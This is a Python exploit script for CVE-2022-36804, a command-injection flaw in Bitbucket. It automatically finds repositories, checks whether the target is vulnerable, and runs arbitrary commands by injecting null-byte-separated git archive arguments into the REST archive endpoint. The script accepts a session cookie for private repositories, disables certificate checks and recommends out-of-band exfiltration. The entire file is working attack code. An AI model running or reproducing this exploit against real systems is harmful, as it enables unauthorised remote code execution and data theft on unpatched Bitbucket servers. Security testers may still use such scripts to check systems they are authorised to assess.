"""
CVE: 2022-36804
Description: Critical Unauthenticated Command Injection in Bitbucket Instances
Author: BenHays142
"""

import requests
import colorama
import argparse
import json
import urllib.parse


def detect_repo(server):
    print(colorama.Fore.WHITE + "[*] Checking for open repos...")
    query = s.get(server + "/rest/api/latest/repos").text
    query_json = json.loads(query)

    if query_json["size"] < 1:
        print(colorama.Fore.RED + "[-] Could not automatically find any suitable repos, perhaps try again with a valid session cookie")
        exit()
    else:
        print(colorama.Fore.GREEN + f"[+] Found {query_json['size']} suitable repo(s)...")

    # Pick first found repo (Maybe Fix later)
    print(colorama.Fore.GREEN + f"[+] Using \"{query_json['values'][0]['slug']}\" Repo inside \"{query_json['values'][0]['project']['name']}\" project...")

    # Note: We have to use the project's key for exploitation to succeed
    return query_json['values'][0]['slug'], query_json['values'][0]['project']['key']


def exec_stuff(server, project, repo, cmd):
    cmd = urllib.parse.quote(cmd)
    print(colorama.Fore.WHITE + "[*] Running command...")
    query = s.get(server + f"/rest/api/latest/projects/{project}/repos/{repo}/archive?format=zip&path=aaa&prefix=test/%00--remote=/%00--exec={cmd}%00--prefix=/").text
    if "An error occurred while executing an external process" in query:
        print(colorama.Fore.RED + f"[-] Target does not appear to be vulnerable or some info is wrong")
    elif "com.atlassian.bitbucket.scm.CommandFailedException" in query:
        print(colorama.Fore.GREEN + "[+] The command has been executed (Note: getting output isn't reliable so OOB exfil using something like DNS or Interactsh is a must)")
        print(colorama.Fore.GREEN + f"[+] Response received from API: {json.loads(query)['errors'][0]['message']}")
    elif "You are not permitted to access this resource" in query:
        print(colorama.Fore.RED + "[-] You don't have access to this resource, if this is a private repo, you can try again using a session cookie")


def check_vuln(server, project, repo):
    print(colorama.Fore.WHITE + "[*] Checking if site is vulnerable...")
    query = s.get(server + f"/rest/api/latest/projects/{project}/repos/{repo}/archive?format=zip&path=aaa&prefix=test/%00test").text

    # Check results
    if "An error occurred while executing an external process" in query:
        return False
    elif "is not a valid ref and may not be archived" in query:
        return True
    elif "You are not permitted to access this resource" in query:
        print(colorama.Fore.RED + "[-] You don't have access to this resource, if this is a private repo, you can try again using a session cookie")
        return False
    else:
        print(colorama.Fore.RED + "[-] Something weird happened, double check your parameters; Or perhaps the instance just isn't vulnerable")
        return False


def main():
    parser = argparse.ArgumentParser(description="Exploit BitBucket Instances (< v8.3.1) using CVE-2022-36804. Exploits "
                                                 "automagically without any extra parameters, but allows for custom "
                                                 "settings as well.")
    parser.add_argument("server")
    parser.add_argument("--project", type=str, action="store", dest="project", help="The name of the project the repository resides in", required=False)
    parser.add_argument("--repo", type=str, action="store", dest="repo", help="The name of the repository", required=False)
    parser.add_argument("--skip-auto", action="store_true", dest="skip_auto", help="Skip the automatic finding of exploitable repos",
                        required=False)
    parser.add_argument("--session", type=str, action="store", dest="session",
                        help="Value of 'BITBUCKETSESSIONID' cookie, useful if target repo is private ")
    parser.add_argument("--command", type=str, action="store", dest="cmd",
                        help="Command to execute if exploit is successful (Note: getting output isn't reliable so OOB exfil is a must)")
    args = parser.parse_args()

    colorama.init(autoreset=True)

    # Initialize requests session and populate it with important data.
    global s
    s = requests.session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"})
    if args.session:
        s.cookies.update({"BITBUCKETSESSIONID": args.session})

    # Handle some edge-cases with argparsing
    if not (args.server.startswith("https://") or args.server.startswith("http://")):
        args.server = "http://" + args.server
        print(args.server)
    if args.project and args.repo and not args.skip_auto:
        args.skip_auto = True
    elif args.project or args.repo:
        print(colorama.Fore.RED + "ERROR: You must provide both --project and --repo if you want to use either.")
        exit()

    if not args.skip_auto:
        args.repo, args.project = detect_repo(args.server)
    else:
        print(colorama.Fore.GREEN + f"[+] Using \"{args.repo}\" Repo inside \"{args.project}\" project...")

    if check_vuln(args.server, args.project, args.repo):
        print(colorama.Fore.GREEN + f"[+] Target is vulnerable!!!")
        if not args.cmd:
            print(colorama.Fore.GREEN + f"[+] Now, try again with --command to execute stuff (Note: getting output isn't reliable so OOB exfil is a must)")
        else:
            exec_stuff(args.server, args.project, args.repo, args.cmd)
    else:
        print(colorama.Fore.RED + f"[-] Target is not vulnerable or some info is wrong")


if __name__ == "__main__":
    main()
